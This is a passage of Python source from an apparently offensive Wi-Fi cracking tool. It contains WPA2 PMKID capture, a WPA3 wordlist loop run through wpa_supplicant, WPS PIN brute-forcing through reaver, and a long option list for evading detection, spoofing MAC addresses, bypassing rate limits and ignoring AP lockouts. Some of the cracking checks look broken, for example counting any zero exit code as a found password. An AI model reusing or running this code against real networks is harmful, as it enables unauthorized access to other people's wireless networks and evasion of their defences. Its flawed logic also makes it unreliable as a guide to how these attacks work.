                    print(f"{ok} WPA2 password found: {green}{self.password}{reset}")
                    if output_file:
                        with open(output_file, 'w') as f:
                            f.write(self.password)
                    return True

        print(f"{err} Password not found in wordlist")
        return False

    def pmkid_attack(self, wordlist_file):
        """PMKID attack for WPA2"""
        print(f"{info} Attempting PMKID attack...")
        cmd = f"hcxdumptool -i {self.interface} --pmkid={self.bssid} --active"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            print(f"{ok} PMKID captured successfully")
            return True

        print(f"{warn} PMKID capture may have failed (requires compatible driver)")
        return False

class WPA3Cracker:
    """WPA3 Dragonblood attack via SAE desynchronization"""

    def __init__(self, interface, target_bssid, target_ssid):
        self.interface = interface
        self.bssid = target_bssid
        self.ssid = target_ssid
        self.cracked = False
        self.password = None

    def sae_desync_attack(self, wordlist_file, sync=False):
        """WPA3 SAE desynchronization/synchronization attack"""
        print(f"{info} Attempting WPA3 SAE {'desync' if not sync else 'sync'} attack...")

        if not os.path.exists(wordlist_file):
            print(f"{err} Wordlist not found: {wordlist_file}")
            return False

        print(f"{info} Testing passwords against WPA3 AP...")

        tested = 0
        with open(wordlist_file, 'r') as wl:
            for password in wl:
                password = password.strip()
                if not password:
                    continue

                config = f"""
ctrl_interface=/tmp/wpa_cli
network={{
    ssid="{self.ssid}"
    psk="{password}"
    sae_groups=19 20 21
    ieee80211w=2
}}
"""
                with open('/tmp/wpa3_test.conf', 'w') as f:
                    f.write(config)

                cmd = f"timeout 10 wpa_supplicant -i {self.interface} -c /tmp/wpa3_test.conf"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                tested += 1
                if 'CTRL-EVENT-CONNECTED' in result.stdout or result.returncode == 0:
                    self.password = password
                    self.cracked = True
                    print(f"{ok} WPA3 password found: {green}{password}{reset}")
                    return True

                if tested % 100 == 0:
                    print(f"{info} Tested {tested} passwords...")

        print(f"{err} WPA3 password not found in wordlist")
        return False

class SmartBruteforce:
    """Enhanced online bruteforce with rate limiting and intelligent retry"""

    def __init__(self, interface, target_bssid, target_ssid):
        self.interface = interface
        self.bssid = target_bssid
        self.ssid = target_ssid
        self.attempt_count = 0
        self.rate_limit_delay = 1.0
        self.max_retries = 3
        self.adaptive_delay = True
        self.lock_detected = False
        self.success = False

    def generate_common_pins(self):
        """Generate common/weak WPS PINs"""
        common = [
            '12345670',
            '11223344',
            '00000000',
            '88888888',
            '12121212',
            '99887766',
            '45678901',
            '11111111',
            '55555555',
            '44444444',
            '33333333',
            '22222222'
        ]
        return common

    def bruteforce_wps(self, word_gen=None, max_attempts=11000):
        """Perform smart WPS bruteforce with rate limiting"""
        print(f"{info} Starting smart WPS bruteforce...")
        print(f"{info} Max attempts: {max_attempts}")

        pins_to_test = word_gen if word_gen else self.generate_common_pins()

        for pin in pins_to_test:
            if self.attempt_count >= max_attempts:
                print(f"{warn} Max attempts reached")
                break

            self.attempt_count += 1

            if self.adaptive_delay and self.attempt_count % 50 == 0:
                self.rate_limit_delay += 0.5

            time.sleep(self.rate_limit_delay)

            cmd = f"timeout 15 reaver -i {self.interface} -b {self.bssid} -p {pin} -N -T 1 -c 6"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if 'WPS PIN' in result.stdout or 'key' in result.stdout.lower():
                print(f"{ok} WPS PIN found: {green}{pin}{reset}")
                self.success = True
                return True

            if 'locked' in result.stdout.lower():
                print(f"{warn} AP WPS locked, waiting before retry...")
                self.lock_detected = True
                time.sleep(60)

            if self.attempt_count % 100 == 0:
                print(f"{info} Tested {self.attempt_count} PINs...")

        print(f"{err} Bruteforce failed after {self.attempt_count} attempts")
        return False

    def dictionary_attack(self, wordlist_file):
        """Attack using password dictionary"""
        if not os.path.exists(wordlist_file):
            print(f"{err} Wordlist not found: {wordlist_file}")
            return False

        print(f"{info} Starting dictionary attack...")
        with open(wordlist_file, 'r') as wl:
            for password in wl:
                password = password.strip()
                if not password:
                    continue

                self.attempt_count += 1
                time.sleep(self.rate_limit_delay)

                cmd = f"timeout 10 iwconfig {self.interface} essid {self.ssid} key s:{password}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                if result.returncode == 0:
                    print(f"{ok} Password found: {green}{password}{reset}")
                    self.success = True
                    return True

                if self.attempt_count % 50 == 0:
                    print(f"{info} Tested {self.attempt_count} passwords...")

        return False

if __name__ == '__main__':
    import argparse
    from argparse import RawDescriptionHelpFormatter

    epilog_text = ""

    parser = argparse.ArgumentParser(
        description='WiFi WPS PIN Cracking Tool',
        epilog='',
        formatter_class=RawDescriptionHelpFormatter,
        add_help=True
    )

    basic_group = parser.add_argument_group('Required arguments')

    basic_group.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        metavar='INTERFACE',
        help='Name of the interface to use'
    )
    basic_group.add_argument(
        '-b', '--bssid',
        type=str,
        metavar='AA:BB:CC:DD:EE:FF',
        help='BSSID of the target AP'
    )
    basic_group.add_argument(
        '-p', '--pin',
        type=str,
        metavar='PIN',
        help='Use the specified pin (4/8 digit pin or blank for Null Pin attack)'
    )
    basic_group.add_argument(
        '--loop',
        action='store_true',
        help='Run in a loop'
    )

    attack_group = parser.add_argument_group('Optional arguments')

    attack_group.add_argument(
        '-K', '-k', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
    )
    attack_group.add_argument(
        '-F', '-f', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
    )
    attack_group.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
    )
    attack_group.add_argument(
        '-ob', '--online-bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
    )
    attack_group.add_argument(
        '-da', '--dictionary-attack',
        action='store_true',
        help='Run dictionary-based password attack'
    )

    timing_group = parser.add_argument_group('Optional arguments')

    timing_group.add_argument(
        '-d', '--delay',
        type=float,
        default=0,
        metavar='SECONDS',
        help='Set the delay between pin attempts'
    )
    timing_group.add_argument(
        '-l', '--lock-delay',
        type=int,
        default=60,
        metavar='SECONDS',
        help='Wait time after AP locks WPS (default: 60). Increase if needed'
    )
    timing_group.add_argument(
        '-t', '--timeout',
        type=int,
        default=10,
        metavar='SECONDS',
        help='Receive timeout for WPS responses (default: 10)'
    )
    timing_group.add_argument(
        '-T', '--m57-timeout',
        type=float,
        default=0.40,
        metavar='SECONDS',
        help='M5/M7 timeout (default: 0.40). Fine-tune for timing attacks'
    )
    timing_group.add_argument(
        '-r', '--recurring-delay',
        type=str,
        metavar='X:Y',
        help='Sleep Y seconds every X attempts (format: "10:5"). Evade detection'
    )
    timing_group.add_argument(
        '-x', '--fail-wait',
        type=int,
        default=0,
        metavar='SECONDS',
        help='Sleep after 10 unexpected failures (default: 0)'
    )

    bruteforce_group = parser.add_argument_group('Optional arguments')

    bruteforce_group.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
    )
    bruteforce_group.add_argument(
        '-g', '--max-attempts',
        type=int,
        default=0,
        metavar='NUM',
        help='Maximum PIN attempts before giving up (default: unlimited)'
    )
    bruteforce_group.add_argument(
        '--pin-limit',
        type=int,
        default=10000,
        metavar='NUM',
        help='Limit PIN bruteforce patterns to test (default: 10000)'
    )
    bruteforce_group.add_argument(
        '--bruteforce-threads',
        type=int,
        default=4,
        metavar='NUM',
        help='Threads for bruteforce (default: 4). More = faster but uses more resources'
    )
    bruteforce_group.add_argument(
        '-L', '--ignore-locks',
        action='store_true',
        help='Ignore AP lock announcements and keep attacking (risky)'
    )
    bruteforce_group.add_argument(
        '-M', '--mac-changer',
        action='store_true',
        help='Change MAC address for each PIN attempt - Evade per-MAC rate limiting'
    )

    dict_group = parser.add_argument_group('Optional arguments')

    dict_group.add_argument(
        '--wordlist',
        type=str,
        metavar='/path/to/wordlist.txt',
        help='Custom wordlist for dictionary attacks. Default: ~/.Wipwn/wordlists/common.txt'
    )
    dict_group.add_argument(
        '--dict-threads',
        type=int,
        default=4,
        metavar='NUM',
        help='Parallel threads for dictionary testing (default: 4)'
    )

    recon_group = parser.add_argument_group('Optional arguments')

    recon_group.add_argument(
        '--advanced-recon',
        action='store_true',
        help='Advanced network fingerprinting - Extract vendor/chipset/beacon info'
    )
    recon_group.add_argument(
        '--detect-weak-algo',
        action='store_true',
        help='Detect routers using weak WPS algorithms - Priority targets'
    )
    recon_group.add_argument(
        '--signal-analysis',
        action='store_true',
        help='Analyze signal strength patterns - Detect AP type from transmission power'
    )
    recon_group.add_argument(
        '--detect-rate-limit',
        action='store_true',
        help='Test if target implements rate limiting on failed attempts'
    )
    recon_group.add_argument(
        '--check-vuln',
        action='store_true',
        help='Check target against known vulnerability list'
    )

    evasion_group = parser.add_argument_group('Advanced arguments')

    evasion_group.add_argument(
        '--bypass-rate-limit',
        action='store_true',
        help='Apply rate-limit bypass (MAC spoofing, channel hopping, timing)'
    )
    evasion_group.add_argument(
        '--spoof-mac',
        action='store_true',
        help='Spoof random MAC each attempt - Advanced evasion'
    )
    evasion_group.add_argument(
        '--custom-mac',
        type=str,
        metavar='AA:BB:CC:DD:EE:FF',
        help='Use specific custom MAC address for spoofing'
    )
    evasion_group.add_argument(
        '--channel-hop',
        action='store_true',
        help='Hop between WiFi channels during attack - Evade detection'
    )

    session_group = parser.add_argument_group('Advanced arguments')

    session_group.add_argument(
        '-s', '--session',
        type=str,
        metavar='SESSION_ID',
        help='Save/resume session with this ID. Pick up where you left off'
    )
    session_group.add_argument(
        '--resume-session',
        type=str,
        metavar='SESSION_ID',
        help='Resume specific previous session from ~/.Wipwn/sessions/'
    )
    session_group.add_argument(
        '--list-sessions',
        action='store_true',
        help='List all saved sessions with progress'
    )
    session_group.add_argument(
        '--session-dir',
        type=str,
        default=f'{USER_HOME}/.Wipwn/sessions/',
        metavar='/path/to/sessions/',
        help='Custom directory for session files (default: ~/.Wipwn/sessions/)'
    )

    results_group = parser.add_argument_group('Advanced arguments')

    results_group.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write cracked credentials to file on success'
    )
    results_group.add_argument(
        '--auto-vuln-list',
        action='store_true',
        help='Auto-add successfully cracked APs to vulnerability list (vulnwsc.txt)'
    )
    results_group.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        metavar='/path/to/vulnwsc.txt',
        help='Vulnerability list file (default: ./vulnwsc.txt)'
    )
    results_group.add_argument(
        '--html-report',
        action='store_true',
        help='Generate HTML penetration test report with findings'
    )
    results_group.add_argument(
        '--detailed-report',
        action='store_true',
        help='Include detailed metrics in reports'
    )
    results_group.add_argument(
        '--report-format',
        type=str,
        choices=['txt', 'csv', 'json'],
        default='txt',
        metavar='{txt,csv,json}',
        help='Report output format (default: txt)'
    )
    results_group.add_argument(
        '--report-dir',
        type=str,
        default='reports',
        metavar='/path/to/reports/',
        help='Directory to save reports (default: ./reports)'
    )
    results_group.add_argument(
        '--json-output',
        type=str,
        metavar='FILE.json',
        help='Save results as JSON file'
    )
    results_group.add_argument(
        '--csv-output',
        type=str,
        metavar='FILE.csv',
        help='Save results as CSV file'
    )
    results_group.add_argument(
        '--log-file',
        type=str,
        metavar='FILE.log',
        help='Log all activity and events to file'
    )

    advanced_group = parser.add_argument_group('Advanced arguments')

    advanced_group.add_argument(
        '--pin-algo',
        type=str,
        choices=['default', 'pin_generation', 'mac_based'],
        default='default',
        metavar='ALGO',
        help='PIN generation algorithm: default (recommended), pin_generation, or mac_based'
    )
    advanced_group.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Always display pixiewps command before execution (debugging)'
    )
    advanced_group.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Control MediaTek WiFi driver on Android devices'
    )
    advanced_group.add_argument(
        '--handle-rfkill',
        action='store_true',
        help='Auto-handle WiFi radio enable/disable (RF-Kill)'
    )
    advanced_group.add_argument(
        '--use-nm',
        action='store_true',
        help='Use NetworkManager for WiFi control instead of wpa_supplicant'
    )
    advanced_group.add_argument(
        '--iface-down',
        action='store_true',
        help='Bring down WiFi interface when finished'
    )
    advanced_group.add_argument(
        '--dts', '--dont-touch-settings',
        action='store_true',
        dest='dont_touch_settings',
        help='Do not modify system WiFi settings (useful for Android/Termux)'
    )

    output_group = parser.add_argument_group('Advanced arguments')

    output_group.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output - Show detailed debug information'
    )
    output_group.add_argument(
        '--no-colors',
        action='store_true',
        help='Disable colored terminal output (for logs/pipes)'
    )
    output_group.add_argument(
        '--reverse-scan',
        action='store_true',
        help='Reverse network list order (for small terminal displays)'
    )

    args = parser.parse_args()

    recurring_delay = None
    if args.recurring_delay:
        try:
            x, y = args.recurring_delay.split(':')
            recurring_delay = (int(x), int(y))
        except:
            die('Invalid recurring delay format. Use x:y (e.g., 10:5)')

    advanced_options = {
        'delay': args.delay,
        'lock_delay': args.lock_delay,
        'timeout': args.timeout,
        'm57_timeout': args.m57_timeout,
        'fail_wait': args.fail_wait,
        'max_attempts': args.max_attempts,
        'ignore_locks': args.ignore_locks,
        'mac_changer': args.mac_changer,
        'session': args.session,
        'recurring_delay': recurring_delay
    }

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    wmtWifi_device = None
    android_network = None

    while True:
        try:
            android_network = AndroidNetwork()

            if isAndroid() is True and not args.dont_touch_settings:
                android_network.storeAlwaysScanState()
                android_network.disableWifi()

            companion = Companion(args.interface, args.write, print_debug=args.verbose, 
                                advanced_options=advanced_options, vuln_list_file=args.vuln_list,
                                add_to_vuln_list=args.auto_vuln_list)
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print(f'{info} BSSID not specified (--bssid) — scanning for available networks')
                    args.bssid = scanner.prompt_network()

                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose,
                                        advanced_options=advanced_options, vuln_list_file=args.vuln_list,
                                        add_to_vuln_list=args.auto_vuln_list)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input(f"\n{ask} Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    print(f"{info} Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print(f"\n{info} Aborting…")
                break
        finally:
            if android_network and isAndroid() is True and not args.dont_touch_settings:
                android_network.enableWifi()
    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi and wmtWifi_device:
        wmtWifi_device.write_text("0")